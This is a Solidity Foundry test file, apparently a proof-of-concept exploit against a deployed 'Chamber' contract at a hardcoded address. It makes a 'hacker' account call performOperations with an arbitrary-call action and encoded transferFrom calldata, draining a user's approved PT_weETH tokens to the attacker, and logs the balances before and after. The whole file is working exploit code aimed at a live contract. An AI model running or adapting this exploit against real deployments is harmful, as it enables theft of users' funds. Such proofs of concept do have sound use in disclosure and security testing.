// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Chamber} from "../src/Chamber2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ChamberHack is Test {
    Chamber public chamber_contract;
    address public PT_weETH;
    address public user;
    address public hacker;
    uint256 public amount = 100 ether;

    function setUp() public {
        chamber_contract = Chamber(0xBC83F2711D0749D7454e4A9D53d8594DF0377c05);
        PT_weETH = 0xc69Ad9baB1dEE23F4605a82b3354F8E40d1E5966;
        user = makeAddr("user");
        hacker = makeAddr("Hacker");
        deal(PT_weETH, user, amount);
    }

    function test_HACK() public {
        console.log(
            "balance of user before approval :: ",
            IERC20(PT_weETH).balanceOf(user)
        );
        vm.prank(user);
        IERC20(PT_weETH).approve(address(chamber_contract), amount);

        uint8[] memory _action = new uint8[](1);
        uint256[] memory _values = new uint256[](1);
        bytes[] memory _data = new bytes[](1);

        _action[0] = 30;
        _values[0] = 0;

        bytes memory _transferFrom_calldata = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            user,
            hacker,
            amount
        );
        _data[0] = abi.encode(
            address(PT_weETH),
            _transferFrom_calldata,
            false,
            false,
            uint8(0)
        );

        vm.prank(hacker);
        chamber_contract.performOperations(_action, _values, _data);
        console.log(
            "balance of user after Hack :: ",
            IERC20(PT_weETH).balanceOf(user)
        );
        console.log(
            "balance of Hacker after Hack ::",
            IERC20(PT_weETH).balanceOf(hacker)
        );
    }
}
